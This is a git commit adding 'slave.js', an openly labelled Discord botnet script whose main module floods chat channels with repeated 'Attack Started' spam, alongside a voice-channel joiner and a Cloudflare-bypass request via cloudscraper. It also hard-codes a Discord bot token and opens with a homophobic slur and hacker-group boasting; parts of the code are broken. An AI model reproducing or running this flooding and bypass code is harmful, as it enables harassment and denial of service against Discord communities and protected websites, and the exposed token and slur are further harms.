081a7d0c0d2bdb5b0817f751207620380ea7d52c
ravahack <o2138914@mvrht.com>
2017-04-06 14:20:16 +0100

    Create slave.js

---
+++ slave.js
@@ -0,0 +1,138 @@
+// Only faggots keep their code Priv8
+// I hope you scrip kiddies are drewling
+// Anonghost is still the king of Cyber
+// Coded by that ahack guy
+
+// Prerequisite downloads from npm package manager
+const Discord = require("discord.js");
+var cloudscraper = require("cloudscraper");
+var chalk = require("chalk");
+var scanf = require("scanf");
+var AnonymousStrategy = require("passport-anonymous").Strategy;
+var passport = require("passport");
+var BasicStrategy = require('passport-http').BasicStrategy;
+var count = 0;
+var option = 0;
+var bot;
+
+//Clients 
+client = new Discord.Client(); 
+client1 = new Discord.Client();
+client2 = new Discord.Client();
+
+// Client tokens go here
+var clients = ['Mjc2NzM1NDQxMTMzMTA5MjUw.C8fEyg.yCeTs25hZ-4_FsBxbkAIpMmz7Ug'];
+
+bot = clients.length;
+console.log(`bot count = %s\n`. bot);
+
+console.log(chalk.bgBlack(`Please wait, loading...`));
+console.log(chalk.cyan(`[+] Imma Chargin Meh Lazer | Compilation Successfull`));
+console.log(chalk.cyan(`[+] Imma Chargin Meh Lazer | Clients Loaded`));
+console.log(chalk.cyan(`[+] Imma Chargin Meh Lazer | Palestine will be free`));
+console.log(chalk.cyan(`[+] Imma Chargin Meh Lazer | Trying to connect to Discord....`));
+console.log(chalk.cyan(`[+] Imma Chargin Meh Lazer | Connected to Discord`));
+console.log(chalk.bgBlack(`Script Kiddies be Scripting\n`));
+
+console.log(chalk.yellow(`
+
+\t	 SSSSS  LL        AAA   VV     VV EEEEEEE    BBBBB    OOOOO  TTTTTTT NN   NN EEEEEEE TTTTTTT 
+\t	SS      LL       AAAAA  VV     VV EE         BB   B  OO   OO   TTT   NNN  NN EE        TTT   
+\t	 SSSSS  LL      AA   AA  VV   VV  EEEEE      BBBBBB  OO   OO   TTT   NN N NN EEEEE     TTT   
+\t	     SS LL      AAAAAAA   VV VV   EE         BB   BB OO   OO   TTT   NN  NNN EE        TTT   
+\t	 SSSSS  LLLLLLL AA   AA    VVV    EEEEEEE    BBBBBB   OOOO0    TTT   NN   NN EEEEEEE   TTT 
+
+	
+\t					[($)] Money isn't everything ~ Paddy	 \n`));
+
+console.log(chalk.red(`\t ############################### `));
+console.log(chalk.white(`\t Discord Botnet (Beta) `));
+console.log(chalk.white(`\t Website: https://discordapp.com`));
+console.log(chalk.white(`\t Version: 0.0.0.0`));
+console.log(chalk.white(`\t Tested on: Windows 10 x64`));
+console.log(chalk.white(`\t Author: ahack`));
+console.log(chalk.red(`\t ###############################\n`));
+
+
+
+
+
+
+console.log(`\t A program that has many incomplete and complete modules for discord application.\n`);
+console.log(`\t Prerequisites:\n\t npm install discord, cloudscrapper, chalk, scanf, ffmpeg, passport-anonymous, passport, passport-http, request \n`);
+console.log(chalk.green.bold(`\t Modules:\n\t [+] Help \n\t [+] Discord Chat (DDOS) \n\t [+] Voice Chat \n\t [+] Cloudflare Bypass  \n\t [+] Verbose Mode \n\t [+] furture_module \n\t [+] future_module \n`)); 
+console.log(chalk.bold(`\t Example:\n\t # Usage: node slave.js\n\t Command: help || ddos || voice || bypass || verbose\n`));
+console.log(`\tSelect one of the modules\n`);
+option = scanf('%s');
+
+switch (option) {
+    case "help":
+        option1 = console.log(``);
+        break;
+    case "ddos":
+        option2 = 
+	// Denial of Service module
+	console.log(`\t Would you like to enable verbose mode?(y/n)\n`);
+	input = scanf('%c');
+	if (input === 'y'){
+		client.on("debug", (m) => console.log(chalk.bold.bgMagenta("[Verbose]", m)));
+		client.on("warn", (m) => console.log(chalk.bgRed("[Warning!]", m)));	
+	}
+     	else if (input === 'n'){
+		console.log(`lol`);
+	}
+	client.on('ready', () => {
+	  console.log(chalk.cyan(`\t\t\t\t\t Slave Discord Bot = [Authenticated] Connecting ...\n`));
+	});
+	
+	client.on('message', message => {
+	  if (message.content === 'lol') {
+	   
+ message.reply('\t :joy: :joy: :joy: ------------->>> Attack Started <<<------------- :joy: :joy: :joy: \n\t\t\t\t\t :poop: :poop: :poop:  ------------->>> Server Stinks <<<------------- :poop:  :poop:  :poop: \n\t\t\t\t\t :joy: :joy: :joy:------------->>> Slave Botnet <<<--------------- :joy: :joy: :joy:');
+ message.reply('\t :joy: :joy: :joy: ------------->>> Attack Started <<<------------- :joy: :joy: :joy: \n\t\t\t\t\t :poop: :poop: :poop:  ------------->>> Server Stinks <<<------------- :poop:  :poop:  :poop: \n\t\t\t\t\t :joy: :joy: :joy:------------->>> Slave Botnet <<<--------------- :joy: :joy: :joy:');
+ message.reply('\t :joy: :joy: :joy: ------------->>> Attack Started <<<------------- :joy: :joy: :joy: \n\t\t\t\t\t :poop: :poop: :poop:  ------------->>> Server Stinks <<<------------- :poop:  :poop:  :poop: \n\t\t\t\t\t :joy: :joy: :joy:------------->>> Slave Botnet <<<--------------- :joy: :joy: :joy:');	
+ message.reply('\t :joy: :joy: :joy: ------------->>> Attack Started <<<------------- :joy: :joy: :joy: \n\t\t\t\t\t :poop: :poop: :poop:  ------------->>> Server Stinks <<<------------- :poop:  :poop:  :poop: \n\t\t\t\t\t :joy: :joy: :joy:------------->>> Slave Botnet <<<--------------- :joy: :joy: :joy:');	
+ message.reply('\t :joy: :joy: :joy: ------------->>> Attack Started <<<------------- :joy: :joy: :joy: \n\t\t\t\t\t :poop: :poop: :poop:  ------------->>> Server Stinks <<<------------- :poop:  :poop:  :poop: \n\t\t\t\t\t :joy: :joy: :joy:------------->>> Slave Botnet <<<--------------- :joy: :joy: :joy:');
+ message.reply('\t :joy: :joy: :joy: ------------->>> Attack Started <<<------------- :joy: :joy: :joy: \n\t\t\t\t\t :poop: :poop: :poop:  ------------->>> Server Stinks <<<------------- :poop:  :poop:  :poop: \n\t\t\t\t\t :joy: :joy: :joy:------------->>> Slave Botnet <<<--------------- :joy: :joy: :joy:');
+ message.reply('\t :joy: :joy: :joy: ------------->>> Attack Started <<<------------- :joy: :joy: :joy: \n\t\t\t\t\t :poop: :poop: :poop:  ------------->>> Server Stinks <<<------------- :poop:  :poop:  :poop: \n\t\t\t\t\t :joy: :joy: :joy:------------->>> Slave Botnet <<<--------------- :joy: :joy: :joy:');	
+ message.reply('\t :joy: :joy: :joy: ------------->>> Attack Started <<<------------- :joy: :joy: :joy: \n\t\t\t\t\t :poop: :poop: :poop:  ------------->>> Server Stinks <<<------------- :poop:  :poop:  :poop: \n\t\t\t\t\t :joy: :joy: :joy:------------->>> Slave Botnet <<<--------------- :joy: :joy: :joy:');}
+	  
+	}); 
+
+	for (count = 0; count < 5; count++) {
+	    client.login(clients[count]);
+	};
+        break;
+    case "respawn":// Joins the voice channel as soon as the client starts up
+client.on('ready', () => {
+  // Get the channel via ID
+  let channel = client.channels.get('299223773289381900');
+
+  channel.join()
+  .then(connection => console.log('Connected'))
+  .catch(console.error);
+});
+
+
+	for (count = 0; count < 5; count++) {
+	    client.login(clients[count]);
+	};
+	break;
+    case "bypass":
+        option3 = cloudscraper.get('http://website.com/', function(error, response, body) {
+  if (error) {
+    console.log('Error occurred');
+  } else {
+    console.log(body, response);
+  }
+});;
+        break;
+    case "verbose":
+        option4 = ""
+        break;
+    case "soon":
+        option5 = "";
+        break;
+    default:
+	option6 = "";
+}
